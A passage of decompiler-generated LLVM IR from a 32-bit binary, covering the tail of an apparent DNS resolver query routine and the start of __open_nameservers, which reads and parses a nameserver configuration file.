  %v3_10011d8c = icmp ugt i32 %v0_10011d8c, %v1_10011d8c
  br i1 %v3_10011d8c, label %dec_label_pc_10011e08, label %dec_label_pc_10011d94

dec_label_pc_10011d94:                            ; preds = %dec_label_pc_10011d6c
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_10011d9c = load i32, i32* @r31, align 4
  %v2_10011d9c = add i32 %v1_10011d9c, 36
  %v3_10011d9c = inttoptr i32 %v2_10011d9c to i32*
  store i32 0, i32* %v3_10011d9c, align 4
  br label %dec_label_pc_10011dec

dec_label_pc_10011da4:                            ; preds = %dec_label_pc_10011cfc
  %v3_10011da4 = load i32, i32* %stack_var_-184, align 4
  store i32 268508588, i32* @lr, align 4
  %v1_10011da8 = call i32 @free(i32 %v3_10011da4)
  store i32 %tmp29, i32* %r0.global-to-local, align 4
  %v1_10011db0 = load i32, i32* %r16.global-to-local, align 4
  %v4_10011db0 = icmp eq i32 %tmp29, %v1_10011db0
  br i1 %v4_10011db0, label %dec_label_pc_10011db8, label %dec_label_pc_10011dec

dec_label_pc_10011db8:                            ; preds = %dec_label_pc_10011da4
  %v0_10011db8 = load i32, i32* @r31, align 4
  %v1_10011db8 = add i32 %v0_10011db8, 16
  %v2_10011db8 = inttoptr i32 %v1_10011db8 to i32*
  %v3_10011db8 = load i32, i32* %v2_10011db8, align 4
  store i32 %v3_10011db8, i32* @r5, align 4
  store i32 %tmp28, i32* %r0.global-to-local, align 4
  %v4_10011dc0 = icmp eq i32 %v3_10011db8, %tmp28
  br i1 %v4_10011dc0, label %dec_label_pc_10011dc8, label %dec_label_pc_10011e4c

dec_label_pc_10011dc8:                            ; preds = %dec_label_pc_10011db8
  %v1_10011dc8 = add i32 %v0_10011db8, 36
  %v2_10011dc8 = inttoptr i32 %v1_10011dc8 to i32*
  %v3_10011dc8 = load i32, i32* %v2_10011dc8, align 4
  %v1_10011dcc = add i32 %v0_10011db8, 28
  %v2_10011dcc = inttoptr i32 %v1_10011dcc to i32*
  %v3_10011dcc = load i32, i32* %v2_10011dcc, align 4
  store i32 %v3_10011dcc, i32* %r0.global-to-local, align 4
  %v2_10011dd0 = mul i32 %v3_10011dc8, %tmp28
  %v2_10011dd8 = add i32 %v3_10011dcc, %v2_10011dd0
  store i32 %v2_10011dd8, i32* @r3, align 4
  store i32 268508640, i32* @lr, align 4
  %v0_10011ddc = call i32 @memcpy()
  %v0_10011de0 = load i32, i32* @r31, align 4
  %v1_10011de0 = add i32 %v0_10011de0, 36
  %v2_10011de0 = inttoptr i32 %v1_10011de0 to i32*
  %v3_10011de0 = load i32, i32* %v2_10011de0, align 4
  %v1_10011de4 = add i32 %v3_10011de0, 1
  store i32 %v1_10011de4, i32* %v2_10011de0, align 4
  br label %dec_label_pc_10011dec

dec_label_pc_10011dec:                            ; preds = %dec_label_pc_10011da4, %dec_label_pc_10011d94, %dec_label_pc_10011d60, %dec_label_pc_10011dc8
  %stack_var_-88.0 = phi i32 [ 0, %dec_label_pc_10011dc8 ], [ 0, %dec_label_pc_10011da4 ], [ 0, %dec_label_pc_10011d94 ], [ %stack_var_-88.118, %dec_label_pc_10011d60 ]
  %v0_10011dec = load i32, i32* @r28, align 4
  %v1_10011dec = load i32, i32* %r15.global-to-local, align 4
  %v2_10011dec = add i32 %v1_10011dec, %v0_10011dec
  store i32 %v2_10011dec, i32* %r28.global-to-local, align 4
  %v0_10011df0 = load i32, i32* @r24, align 4
  %v1_10011df0 = add i32 %v0_10011df0, 1
  store i32 %v1_10011df0, i32* @r24, align 4
  store i32 %tmp35, i32* %r0.global-to-local, align 4
  %v2_10011df8 = icmp slt i32 %v1_10011df0, %tmp35
  br i1 %v2_10011df8, label %dec_label_pc_10011e00, label %dec_label_pc_10011e08

dec_label_pc_10011e00:                            ; preds = %dec_label_pc_10011cb4, %dec_label_pc_10011dec
  %v0_10011ccc = phi i32 [ %v2_10011dec, %dec_label_pc_10011dec ], [ %v2_10011c98, %dec_label_pc_10011cb4 ]
  %stack_var_-88.118 = phi i32 [ %stack_var_-88.0, %dec_label_pc_10011dec ], [ 1, %dec_label_pc_10011cb4 ]
  %v1_10011e00 = load i32, i32* @r27, align 4
  %v2_10011e00 = icmp slt i32 %v0_10011ccc, %v1_10011e00
  br i1 %v2_10011e00, label %dec_label_pc_10011cc4, label %dec_label_pc_10011e08

dec_label_pc_10011e08:                            ; preds = %dec_label_pc_10011cec, %dec_label_pc_10011cb4, %dec_label_pc_10011e00, %dec_label_pc_10011d3c, %dec_label_pc_10011d6c, %dec_label_pc_10011dec, %dec_label_pc_10011d50
  %v0_10011e08 = load i32, i32* @r19, align 4
  store i32 268508688, i32* @lr, align 4
  %v1_10011e0c = call i32 @__libc_close(i32 %v0_10011e08)
  %v3_10011e14 = icmp eq i32 %arg5, 0
  %v0_10011e24 = load i32, i32* @r30, align 4
  br i1 %v3_10011e14, label %dec_label_pc_10011e24, label %dec_label_pc_10011e1c

dec_label_pc_10011e1c:                            ; preds = %dec_label_pc_10011e08
  %v2_10011e1c = inttoptr i32 %arg5 to i32*
  store i32 %v0_10011e24, i32* %v2_10011e1c, align 4
  br label %dec_label_pc_10011e2c

dec_label_pc_10011e24:                            ; preds = %dec_label_pc_10011e08
  store i32 268508716, i32* @lr, align 4
  %v1_10011e28 = call i32 @free(i32 %v0_10011e24)
  br label %dec_label_pc_10011e2c

dec_label_pc_10011e2c:                            ; preds = %dec_label_pc_10011e1c, %dec_label_pc_10011e24
  %v0_10011e2c = load i32, i32* @r21, align 4
  store i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32* %r29.global-to-local, align 4
  store i32 268508728, i32* @lr, align 4
  %v1_10011e34 = call i32 @free(i32 %v0_10011e2c)
  store i32 ptrtoint (i32* @global_var_10031ba0.803 to i32), i32* %r29.global-to-local, align 4
  br label %dec_label_pc_10011f30

dec_label_pc_10011e4c:                            ; preds = %dec_label_pc_10011db8
  %v1_10011e4c = inttoptr i32 %v0_10011db8 to i32*
  %v2_10011e4c = load i32, i32* %v1_10011e4c, align 4
  store i32 268508756, i32* @lr, align 4
  %v1_10011e50 = call i32 @free(i32 %v2_10011e4c)
  br label %dec_label_pc_10011e54

dec_label_pc_10011e54:                            ; preds = %dec_label_pc_10011c64, %dec_label_pc_10011bcc, %dec_label_pc_10011cec, %dec_label_pc_10011ce4, %dec_label_pc_10011be4, %dec_label_pc_10011bac, %dec_label_pc_10011e4c
  %v0_10011e54 = load i32, i32* %r17.global-to-local, align 4
  %v3_10011e54 = icmp eq i32 %v0_10011e54, 0
  br i1 %v3_10011e54, label %dec_label_pc_10011e5c, label %dec_label_pc_10011eac

dec_label_pc_10011e5c:                            ; preds = %dec_label_pc_10011e54
  store i32 ptrtoint (i32* @global_var_1002b870.751 to i32), i32* %r29.global-to-local, align 4
  store i32 %v2_10011960, i32* %r28.global-to-local, align 4
  store i32 %v2_10011960, i32* @r3, align 4
  %v0_10011e78 = call i32 @__pthread_return_void()
  %v0_10011e80 = call i32 @__pthread_return_0()
  %v3_10011e88 = load i32, i32* @global_var_1002b968.807, align 4
  store i32 %v2_10011960, i32* @r3, align 4
  %v1_10011e94 = add i32 %v3_10011e88, -1
  store i32 %v1_10011e94, i32* %r29.global-to-local, align 4
  %v0_10011e98 = call i32 @__pthread_return_void()
  %v0_10011e9c = load i32, i32* @r22, align 4
  %v2_10011e9c = icmp slt i32 %v0_10011e9c, %v1_10011e94
  br i1 %v2_10011e9c, label %dec_label_pc_10011ea4, label %dec_label_pc_10011eac

dec_label_pc_10011ea4:                            ; preds = %dec_label_pc_10011e5c
  %v1_10011ea4 = add i32 %v0_10011e9c, 1
  store i32 %v1_10011ea4, i32* @r22, align 4
  br label %dec_label_pc_10011ec8thread-pre-split.backedge

dec_label_pc_10011ec8thread-pre-split.backedge:   ; preds = %dec_label_pc_10011ea4, %dec_label_pc_10011c4c, %dec_label_pc_10011ec4
  %v0_10011ec8.pr = load i32, i32* %r18.global-to-local, align 4
  %tmp65 = icmp ult i32 %v0_10011ec8.pr, 3
  br i1 %tmp65, label %dec_label_pc_100119bc.lr.ph, label %dec_label_pc_10011ee0

dec_label_pc_10011eac:                            ; preds = %dec_label_pc_10011b5c, %dec_label_pc_10011e5c, %dec_label_pc_10011e54, %dec_label_pc_10011b74
  %v0_10011eac = load i32, i32* @r26, align 4
  %v1_10011eac = add i32 %v0_10011eac, 1
  store i32 %v1_10011eac, i32* %r0.global-to-local, align 4
  %v1_10011eb0 = load i32, i32* @r23, align 4
  %v2_10011eb0 = srem i32 %v1_10011eac, %v1_10011eb0
  store i32 %v2_10011eb0, i32* @r26, align 4
  %v5_10011eb8 = icmp eq i32 %v2_10011eb0, 0
  br i1 %v5_10011eb8, label %dec_label_pc_10011ec0, label %dec_label_pc_10011ec4

dec_label_pc_10011ec0:                            ; preds = %dec_label_pc_10011eac
  %v0_10011ec0 = load i32, i32* %r18.global-to-local, align 4
  %v1_10011ec0 = add i32 %v0_10011ec0, 1
  store i32 %v1_10011ec0, i32* %r18.global-to-local, align 4
  br label %dec_label_pc_10011ec4

dec_label_pc_10011ec4:                            ; preds = %dec_label_pc_10011eac, %dec_label_pc_10011ec0
  store i32 -1, i32* @r22, align 4
  br label %dec_label_pc_10011ec8thread-pre-split.backedge

dec_label_pc_100119bc.lr.ph:                      ; preds = %dec_label_pc_100119bc.lr.ph.lr.ph, %dec_label_pc_10011ec8thread-pre-split.backedge
  br label %dec_label_pc_100119bc

dec_label_pc_10011ed4:                            ; preds = %dec_label_pc_10011934, %dec_label_pc_1001192c, %dec_label_pc_10011924, %entry
  store i32 -1, i32* @r19, align 4
  store i32 -1, i32* @r26, align 4
  store i32 -1, i32* @r25, align 4
  br label %dec_label_pc_10011ee0

dec_label_pc_10011ee0:                            ; preds = %dec_label_pc_10011ec8thread-pre-split.backedge, %dec_label_pc_100119cc, %dec_label_pc_10011aa8, %dec_label_pc_10011b6c, %dec_label_pc_10011940, %dec_label_pc_10011ed4
  %v0_10011ee0 = call i32 @__GI___h_errno_location()
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_10011ee8 = inttoptr i32 %v0_10011ee0 to i32*
  store i32 -1, i32* %v2_10011ee8, align 4
  %v0_10011eec = load i32, i32* @r25, align 4
  store i32 %v0_10011eec, i32* @r20, align 4
  br label %dec_label_pc_10011ef0

dec_label_pc_10011ef0:                            ; preds = %dec_label_pc_10011c8c, %dec_label_pc_10011ee0
  %v0_10011ef0 = load i32, i32* @r19, align 4
  %v3_10011ef0 = icmp eq i32 %v0_10011ef0, -1
  br i1 %v3_10011ef0, label %dec_label_pc_10011f00, label %dec_label_pc_10011ef8

dec_label_pc_10011ef8:                            ; preds = %dec_label_pc_10011ef0
  store i32 268508928, i32* @lr, align 4
  %v1_10011efc = call i32 @__libc_close(i32 %v0_10011ef0)
  br label %dec_label_pc_10011f00

dec_label_pc_10011f00:                            ; preds = %dec_label_pc_10011ef0, %dec_label_pc_10011ef8
  %v0_10011f00 = load i32, i32* @r21, align 4
  store i32 -1, i32* @r27, align 4
  store i32 268508940, i32* @lr, align 4
  %v1_10011f08 = call i32 @free(i32 %v0_10011f00)
  %v0_10011f0c = load i32, i32* @r30, align 4
  store i32 268508948, i32* @lr, align 4
  %v1_10011f10 = call i32 @free(i32 %v0_10011f0c)
  %v0_10011f14 = load i32, i32* @r26, align 4
  %v3_10011f14 = icmp eq i32 %v0_10011f14, -1
  br i1 %v3_10011f14, label %dec_label_pc_10011f60, label %dec_label_pc_10011f1c

dec_label_pc_10011f1c:                            ; preds = %dec_label_pc_10011f00
  store i32 ptrtoint (i32* @global_var_10031ba0.803 to i32), i32* %r29.global-to-local, align 4
  %v2_10011f28 = ptrtoint i32* %stack_var_-228 to i32
  br label %dec_label_pc_10011f30

dec_label_pc_10011f30:                            ; preds = %dec_label_pc_10011e2c, %dec_label_pc_10011f1c
  %storemerge68 = phi i32 [ %v2_10011f28, %dec_label_pc_10011f1c ], [ %v2_10011960, %dec_label_pc_10011e2c ]
  %v1_10011f34.pre-phi = phi i32 [ %v2_10011f28, %dec_label_pc_10011f1c ], [ %v2_10011960, %dec_label_pc_10011e2c ]
  store i32 %storemerge68, i32* %r28.global-to-local, align 4
  store i32 %v1_10011f34.pre-phi, i32* @r3, align 4
  %v0_10011f38 = call i32 @__pthread_return_void()
  %v0_10011f40 = call i32 @__pthread_return_0()
  %v0_10011f48 = load i32, i32* @r26, align 4
  store i32 %v0_10011f48, i32* @global_var_1002b960.804, align 4
  store i32 %v1_10011f34.pre-phi, i32* @r3, align 4
  %v0_10011f58 = load i32, i32* @r20, align 4
  %v1_10011f58 = trunc i32 %v0_10011f58 to i16
  store i16 %v1_10011f58, i16* @global_var_1002b86c.805, align 2
  %v0_10011f5c = call i32 @__pthread_return_void()
  br label %dec_label_pc_10011f60

dec_label_pc_10011f60:                            ; preds = %dec_label_pc_10011f00, %dec_label_pc_10011f30
  store i32 %v0_100118e0, i32* %r0.global-to-local, align 4
  %v0_10011f64 = load i32, i32* @r27, align 4
  ret i32 %v0_10011f64

; uselistorder directives
  uselistorder i32 %v1_10011f34.pre-phi, { 1, 0 }
  uselistorder i32 %v2_10011eb0, { 1, 0 }
  uselistorder i32 %v0_10011e24, { 1, 0 }
  uselistorder i32 %v1_10011e00, { 1, 0 }
  uselistorder i32 %stack_var_-88.118, { 1, 0, 2 }
  uselistorder i32 %v0_10011ccc, { 1, 0 }
  uselistorder i32 %v1_10011df0, { 1, 0 }
  uselistorder i32 %v0_10011db8, { 0, 2, 1, 3 }
  uselistorder i32 %v1_10011d7c, { 1, 0 }
  uselistorder i32 %v0_10011d08, { 2, 1, 0 }
  uselistorder i32 %v0_10011ca4, { 1, 0 }
  uselistorder i32 %v2_10011c98, { 0, 2, 1, 3 }
  uselistorder i32 %v4_10011bbc, { 1, 0 }
  uselistorder i32 %v1_10011abc, { 1, 0 }
  uselistorder i32 %v1_10011a90, { 1, 0 }
  uselistorder i32 %v1_10011a5c, { 1, 0 }
  uselistorder i32 %v1_100119f4, { 1, 0 }
  uselistorder i32 %v2_10011960, { 0, 1, 5, 6, 7, 2, 3, 4, 8, 9, 10, 11, 12 }
  uselistorder i32* %stack_var_-144, { 1, 0, 2, 3 }
  uselistorder i16* %stack_var_-212, { 0, 1, 4, 3, 2 }
  uselistorder i32* %stack_var_-184, { 1, 0, 2 }
  uselistorder i32 %tmp36, { 1, 0, 2 }
  uselistorder i32 %tmp35, { 6, 5, 0, 1, 2, 4, 3 }
  uselistorder i32 %tmp29, { 1, 0 }
  uselistorder i32 %tmp28, { 0, 2, 1 }
  uselistorder i32* %r29.global-to-local, { 1, 2, 3, 4, 5, 6, 8, 7, 0, 9, 10, 11, 12, 13, 14, 15, 16 }
  uselistorder i32* %r28.global-to-local, { 0, 2, 3, 5, 4, 1, 6, 7, 8, 9 }
  uselistorder i32* %r18.global-to-local, { 0, 4, 2, 1, 5, 3, 6 }
  uselistorder i32* %r17.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r16.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32* %r0.global-to-local, { 3, 4, 5, 16, 6, 7, 8, 11, 9, 10, 12, 13, 14, 15, 2, 17, 0, 1, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_recv, { 1, 4, 3, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_send, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32 101, { 3, 0, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @__libc_connect, { 1, 4, 3, 5, 2, 0 }
  uselistorder i32 (i32, i32, i32)* @socket, { 1, 5, 4, 3, 2, 6, 0 }
  uselistorder i32 (i32)* @inet_addr, { 0, 3, 2, 1 }
  uselistorder i32 53, { 3, 0, 1, 2 }
  uselistorder i16 10, { 0, 2, 1, 3 }
  uselistorder i32 (i32, i32, i32)* @strncpy, { 2, 1, 0, 3 }
  uselistorder i16* @global_var_1002b86c.805, { 1, 0 }
  uselistorder i32 1025, { 2, 3, 1, 4, 0 }
  uselistorder i32 512, { 7, 11, 1, 2, 3, 8, 9, 10, 4, 6, 5, 0 }
  uselistorder label %dec_label_pc_10011f60, { 1, 0 }
  uselistorder label %dec_label_pc_10011f30, { 1, 0 }
  uselistorder label %dec_label_pc_10011f00, { 1, 0 }
  uselistorder label %dec_label_pc_10011ef0, { 1, 0 }
  uselistorder label %dec_label_pc_10011ee0, { 5, 0, 3, 2, 1, 4 }
  uselistorder label %dec_label_pc_100119bc.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_10011ec4, { 1, 0 }
  uselistorder label %dec_label_pc_10011eac, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_10011ec8thread-pre-split.backedge, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10011e54, { 6, 2, 3, 0, 4, 1, 5 }
  uselistorder label %dec_label_pc_10011e2c, { 1, 0 }
  uselistorder label %dec_label_pc_10011e08, { 2, 5, 4, 6, 3, 0, 1 }
  uselistorder label %dec_label_pc_10011e00, { 1, 0 }
  uselistorder label %dec_label_pc_10011dec, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10011d58, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10011c94, { 1, 0 }
  uselistorder label %dec_label_pc_10011c8c, { 1, 0 }
  uselistorder label %dec_label_pc_10011b30, { 1, 0 }
  uselistorder label %dec_label_pc_10011aa8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100119cc, { 1, 0 }
}

define i32 @__open_nameservers() local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-164 = alloca i32, align 4
  %stack_var_-200 = alloca i32, align 4
  %v2_10011f98 = ptrtoint i32* %stack_var_-200 to i32
  store i32 %v2_10011f98, i32* @r3, align 4
  %v0_10011fa0 = call i32 @__pthread_return_void()
  store i32 ptrtoint (i32* @global_var_1002b870.751 to i32), i32* %r3.global-to-local, align 4
  %v0_10011fa8 = call i32 @__pthread_return_0()
  store i32 %v0_10011fa8, i32* %r3.global-to-local, align 4
  %v3_10011fb0 = load i32, i32* @global_var_1002b964.753, align 4
  %v2_10011fb4 = icmp sgt i32 %v3_10011fb0, 0
  br i1 %v2_10011fb4, label %dec_label_pc_1001222c, label %dec_label_pc_10011fbc

dec_label_pc_10011fbc:                            ; preds = %entry
  store i32 ptrtoint ([17 x i8]* @global_var_1001a4c8.818 to i32), i32* %r3.global-to-local, align 4
  store i32 268509140, i32* @lr, align 4
  %v3_10011fd0 = call i32 @__GI_fopen(i32 ptrtoint ([17 x i8]* @global_var_1001a4c8.818 to i32), i32 ptrtoint (i32* @global_var_1001a4dc.817 to i32))
  store i32 %v3_10011fd0, i32* %r3.global-to-local, align 4
  store i32 %v3_10011fd0, i32* @r26, align 4
  %v3_10011fd4 = icmp eq i32 %v3_10011fd0, 0
  br i1 %v3_10011fd4, label %dec_label_pc_10011fdc, label %dec_label_pc_100121f0.preheader

dec_label_pc_10011fdc:                            ; preds = %dec_label_pc_10011fbc
  %v0_10011fe0 = load i32, i32* @r31, align 4
  store i32 ptrtoint ([24 x i8]* @global_var_1001a4e0.819 to i32), i32* %r3.global-to-local, align 4
  store i32 268509164, i32* @lr, align 4
  %v3_10011fe8 = call i32 @__GI_fopen(i32 ptrtoint ([24 x i8]* @global_var_1001a4e0.819 to i32), i32 %v0_10011fe0)
  store i32 %v3_10011fe8, i32* %r3.global-to-local, align 4
  store i32 %v3_10011fe8, i32* @r26, align 4
  %v3_10011fec = icmp eq i32 %v3_10011fe8, 0
  br i1 %v3_10011fec, label %dec_label_pc_10012220, label %dec_label_pc_100121f0.preheader

dec_label_pc_100121f0.preheader:                  ; preds = %dec_label_pc_10011fbc, %dec_label_pc_10011fdc
  %v0_100121fc16 = phi i32 [ %v3_10011fd0, %dec_label_pc_10011fbc ], [ %v3_10011fe8, %dec_label_pc_10011fdc ]
  %v2_100121f0 = ptrtoint i32* %stack_var_-164 to i32
  %v1_10011ffc2 = bitcast i32* %stack_var_-164 to i8*
  %v3_100120e0 = inttoptr i32 %tmp to i8*
  br label %dec_label_pc_100121f0

dec_label_pc_10011ff8:                            ; preds = %dec_label_pc_10012010
  %v1_10011ff8 = add i32 %v0_100120b89, 1
  store i32 %v1_10011ff8, i32* %r3.global-to-local, align 4
  %v1_10011ffc = inttoptr i32 %v1_10011ff8 to i8*
  %v2_10011ffc = load i8, i8* %v1_10011ffc, align 1
  %v3_10011ffc = zext i8 %v2_10011ffc to i32
  store i32 %v3_10011ffc, i32* %r11.global-to-local, align 4
  %v3_10012004 = icmp eq i8 %v2_10011ffc, 0
  br i1 %v3_10012004, label %dec_label_pc_100121f0.backedge, label %dec_label_pc_10012010

dec_label_pc_10012010:                            ; preds = %dec_label_pc_10012010.lr.ph, %dec_label_pc_10011ff8
  %v0_10012014.in = phi i32 [ %v3_10011ffc4, %dec_label_pc_10012010.lr.ph ], [ %v3_10011ffc, %dec_label_pc_10011ff8 ]
  %v0_10012028 = phi i32 [ %v3_10011ffc4, %dec_label_pc_10012010.lr.ph ], [ %v3_10011ffc, %dec_label_pc_10011ff8 ]
  %v0_100120b89 = phi i32 [ %v2_100121f0, %dec_label_pc_10012010.lr.ph ], [ %v1_10011ff8, %dec_label_pc_10011ff8 ]
  %v0_10012014 = mul nuw nsw i32 %v0_10012014.in, 2
  %v2_10012014 = add i32 %v0_10012014, %v3_10012010.pre
  %v3_10012014 = inttoptr i32 %v2_10012014 to i16*
  %v4_10012014 = load i16, i16* %v3_10012014, align 2
  %v1_10012018 = and i16 %v4_10012014, 32
  %v3_10012018 = icmp eq i16 %v1_10012018, 0
  br i1 %v3_10012018, label %dec_label_pc_10012020, label %dec_label_pc_10011ff8

dec_label_pc_10012020:                            ; preds = %dec_label_pc_10012010
  %v3_10012020 = icmp eq i32 %v0_10012028, 10
  br i1 %v3_10012020, label %dec_label_pc_100121f0.backedge, label %dec_label_pc_10012028

dec_label_pc_100121f0.backedge:                   ; preds = %dec_label_pc_10011ff8, %dec_label_pc_100121a4, %dec_label_pc_100121ac, %dec_label_pc_100121e4, %dec_label_pc_10011ffc.preheader, %dec_label_pc_10012020, %dec_label_pc_10012028, %dec_label_pc_1001214c
  %v0_100121fc.pre = load i32, i32* @r26, align 4
  br label %dec_label_pc_100121f0

dec_label_pc_10012028:                            ; preds = %dec_label_pc_10012020
  %v3_10012028 = icmp eq i32 %v0_10012028, 35
  br i1 %v3_10012028, label %dec_label_pc_100121f0.backedge, label %dec_label_pc_10012030

dec_label_pc_10012030:                            ; preds = %dec_label_pc_10012028
  store i32 0, i32* @r27, align 4
  store i32 %v2_10011f98, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v1_100120b810 = inttoptr i32 %v0_100120b89 to i8*
  %v2_100120b811 = load i8, i8* %v1_100120b810, align 1
  %v3_100120bc14 = icmp eq i8 %v2_100120b811, 0
  br i1 %v3_100120bc14, label %dec_label_pc_100120cc, label %dec_label_pc_100120c4

dec_label_pc_10012044:                            ; preds = %dec_label_pc_100120c4
  %v1_10012044 = mul i32 %v0_10012044, 4
  %v3_10012048 = load i32, i32* @global_var_1002b8c0, align 4
  store i32 %v3_10012048, i32* %r11.global-to-local, align 4
  %v1_1001204c = load i32, i32* %r6.global-to-local, align 4
  %v2_1001204c = add i32 %v1_1001204c, %v1_10012044
  %v2_10012050 = add i32 %v2_1001204c, 16
  %v3_10012050 = inttoptr i32 %v2_10012050 to i32*
  store i32 %v0_10012050, i32* %v3_10012050, align 4
  %v0_1001205c.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1001205c

dec_label_pc_10012058:                            ; preds = %dec_label_pc_10012070
  %v1_10012058 = add i32 %v0_10012058, 1
  store i32 %v1_10012058, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1001205c

dec_label_pc_1001205c:                            ; preds = %dec_label_pc_10012044, %dec_label_pc_10012058
  %v0_10012058 = phi i32 [ %v0_1001205c.pre, %dec_label_pc_10012044 ], [ %v1_10012058, %dec_label_pc_10012058 ]
  %v1_1001205c = inttoptr i32 %v0_10012058 to i8*
  %v2_1001205c = load i8, i8* %v1_1001205c, align 1
  %v3_10012060 = icmp eq i8 %v2_1001205c, 0
  br i1 %v3_10012060, label %dec_label_pc_1001208c, label %dec_label_pc_10012070

dec_label_pc_10012070:                            ; preds = %dec_label_pc_1001205c
  %v3_10012068 = icmp eq i8 %v2_1001205c, 10
  %v3_1001205c = zext i8 %v2_1001205c to i32
  %v1_10012064 = mul nuw nsw i32 %v3_1001205c, 2
  %v1_10012070 = load i32, i32* %r11.global-to-local, align 4
  %v2_10012070 = add i32 %v1_10012070, %v1_10012064
  %v3_10012070 = inttoptr i32 %v2_10012070 to i16*
  %v4_10012070 = load i16, i16* %v3_10012070, align 2
  %v1_10012074 = and i16 %v4_10012070, 32
  %v3_10012074.not = icmp ne i16 %v1_10012074, 0
  %brmerge = or i1 %v3_10012068, %v3_10012074.not
  br i1 %brmerge, label %dec_label_pc_1001208c, label %dec_label_pc_10012058

dec_label_pc_10012084:                            ; preds = %dec_label_pc_100120a0
  %v0_10012084 = load i32, i32* %r7.global-to-local, align 4
  %v1_10012084 = trunc i32 %v0_10012084 to i8
  store i8 %v1_10012084, i8* %v1_1001208c, align 1
  %v0_10012088 = load i32, i32* %r3.global-to-local, align 4
  %v1_10012088 = add i32 %v0_10012088, 1
  store i32 %v1_10012088, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1001208c

dec_label_pc_1001208c:                            ; preds = %dec_label_pc_10012070, %dec_label_pc_1001205c, %dec_label_pc_10012084
  %v0_100120b8 = phi i32 [ %v1_10012088, %dec_label_pc_10012084 ], [ %v0_10012058, %dec_label_pc_1001205c ], [ %v0_10012058, %dec_label_pc_10012070 ]
  %v1_1001208c = inttoptr i32 %v0_100120b8 to i8*
  %v2_1001208c = load i8, i8* %v1_1001208c, align 1
  %v3_1001208c = zext i8 %v2_1001208c to i32
  %v3_10012090 = icmp eq i8 %v2_1001208c, 0
  %v1_10012094 = mul nuw nsw i32 %v3_1001208c, 2
  store i32 %v1_10012094, i32* %r11.global-to-local, align 4
  br i1 %v3_10012090, label %dec_label_pc_100120b4, label %dec_label_pc_100120a0

dec_label_pc_100120a0:                            ; preds = %dec_label_pc_1001208c
  %v3_10012098 = icmp eq i8 %v2_1001208c, 10
  %v3_100120a0 = load i32, i32* @global_var_1002b8c0, align 4
  %v2_100120a4 = add i32 %v3_100120a0, %v1_10012094
  %v3_100120a4 = inttoptr i32 %v2_100120a4 to i16*
  %v4_100120a4 = load i16, i16* %v3_100120a4, align 2
  %v1_100120a8 = and i16 %v4_100120a4, 32
  %v3_100120a8.not = icmp ne i16 %v1_100120a8, 0
  %brmerge27 = or i1 %v3_10012098, %v3_100120a8.not
  br i1 %brmerge27, label %dec_label_pc_10012084, label %dec_label_pc_100120b4

dec_label_pc_100120b4:                            ; preds = %dec_label_pc_100120a0, %dec_label_pc_1001208c
  %v0_100120b4 = load i32, i32* @r27, align 4
  %v1_100120b4 = add i32 %v0_100120b4, 1
  store i32 %v1_100120b4, i32* @r27, align 4
  %v2_100120b8 = load i8, i8* %v1_1001208c, align 1
  %v3_100120bc = icmp eq i8 %v2_100120b8, 0
  br i1 %v3_100120bc, label %dec_label_pc_100120cc, label %dec_label_pc_100120c4

dec_label_pc_100120c4:                            ; preds = %dec_label_pc_10012030, %dec_label_pc_100120b4
  %v0_10012050 = phi i32 [ %v0_100120b8, %dec_label_pc_100120b4 ], [ %v0_100120b89, %dec_label_pc_10012030 ]
  %v0_10012044 = phi i32 [ %v1_100120b4, %dec_label_pc_100120b4 ], [ 0, %dec_label_pc_10012030 ]
  %tmp33 = icmp slt i32 %v0_10012044, 5
  br i1 %tmp33, label %dec_label_pc_10012044, label %dec_label_pc_100120cc

dec_label_pc_100120cc:                            ; preds = %dec_label_pc_100120b4, %dec_label_pc_100120c4, %dec_label_pc_10012030
  store i32 %tmp, i32* @r30, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_1001a4f8.820 to i32), i32* @r4, align 4
  store i32 1, i32* @r31, align 4
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v4_100120e0 = call i32 @__GI_strcoll(i8* %v3_100120e0, i32 ptrtoint ([11 x i8]* @global_var_1001a4f8.820 to i32))
  store i32 %v4_100120e0, i32* %r3.global-to-local, align 4
  %v3_100120e4 = icmp eq i32 %v4_100120e0, 0
  br i1 %v3_100120e4, label %dec_label_pc_10012110, label %dec_label_pc_10012134

dec_label_pc_100120f0:                            ; preds = %dec_label_pc_10012128
  %v1_100120f0 = add i32 %v2_10012118, 24
  %v2_100120f0 = inttoptr i32 %v1_100120f0 to i32*
  %v3_100120f0 = load i32, i32* %v2_100120f0, align 4
  store i32 %v3_100120f0, i32* %r3.global-to-local, align 4
  store i32 268509432, i32* @lr, align 4
  %v1_100120f4 = call i32 @__GI_strdup(i32 %v3_100120f0)
  store i32 %v1_100120f4, i32* %r3.global-to-local, align 4
  %v0_100120fc = load i32, i32* @r29, align 4
  %v1_100120fc = add i32 %v0_100120fc, 1
  store i32 %v1_100120fc, i32* %r11.global-to-local, align 4
  %v1_10012100 = mul i32 %v0_100120fc, 4
  store i32 %v1_100120fc, i32* @global_var_1002b964.753, align 4
  %v3_1001210c = add i32 %v1_10012100, ptrtoint (i32* @global_var_10031c60.754 to i32)
  %v4_1001210c = inttoptr i32 %v3_1001210c to i32*
